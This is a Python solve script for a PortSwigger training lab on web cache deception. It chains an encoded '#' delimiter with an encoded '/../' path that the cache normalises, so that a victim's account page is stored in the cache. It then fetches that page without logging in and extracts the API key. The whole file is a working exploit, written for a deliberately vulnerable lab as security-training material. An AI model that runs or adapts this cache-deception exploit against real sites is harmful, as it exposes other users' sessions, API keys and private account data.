#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Exploiting cache server normalization for web cache deception.

Chains two discrepancies:
  1. Origin treats %23 (encoded #) as a path delimiter -> sees /my-account
  2. Cache resolves %2f%2e%2e%2f (encoded /../) and applies /resources caching rule

Exploit URL: /my-account%23%2f%2e%2e%2fresources?wcd

Steps:
  1. Log in as wiener:peter to get a session cookie.
  2. Send the exploit URL with the session cookie until X-Cache: hit.
  3. Fetch the URL unauthenticated to retrieve the cached response.
  4. Extract the API key.

In the real lab, deliver the URL to carlos via the exploit server so HIS session
populates the cache, then fetch it unauthenticated to get his API key.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EXPLOIT_PATH = "/my-account%23%2f%2e%2e%2fresources"
CACHE_BUSTER = "wcd"


def login(lab, username, password):
    s = requests.Session()
    s.verify = False
    r = s.get(f"{lab}/login")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise ValueError("CSRF token not found")
    s.post(f"{lab}/login", data={
        "csrf": csrf.group(1),
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return s


def poison_cache(s, lab, max_attempts=20):
    # Send the raw URL — requests must not re-encode the % sequences
    url = f"{lab}{EXPLOIT_PATH}?{CACHE_BUSTER}"
    print(f"[*] Poisoning: {url}")
    for i in range(1, max_attempts + 1):
        r = s.get(url, allow_redirects=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            print("[+] Cache hit confirmed!")
            return True
        time.sleep(0.3)
    return False


def fetch_cached(lab):
    url = f"{lab}{EXPLOIT_PATH}?{CACHE_BUSTER}"
    print(f"\n[*] Fetching cached response unauthenticated: {url}")
    r = requests.get(url, verify=False)
    print(f"[*] X-Cache={r.headers.get('X-Cache', 'none')}")
    return r.text


def extract_api_key(html):
    m = re.search(r'Your API Key is:\s*</strong>\s*([A-Za-z0-9]+)', html)
    if m:
        return m.group(1)
    m = re.search(r'API Key[^:]*:\s*([A-Za-z0-9]{20,})', html)
    return m.group(1) if m else None


def main():
    parser = argparse.ArgumentParser(
        description="Solve WCD Lab: cache server normalization"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = login(lab, args.username, args.password)
    print(f"[*] Logged in as {args.username}")

    if not poison_cache(s, lab):
        print("[-] Cache never hit — verify the exploit path and delimiter.")
        return

    html = fetch_cached(lab)
    api_key = extract_api_key(html)
    if api_key:
        print(f"\n[+] API key: {api_key}")
    else:
        print("[-] API key not found — check the response manually.")


if __name__ == "__main__":
    main()
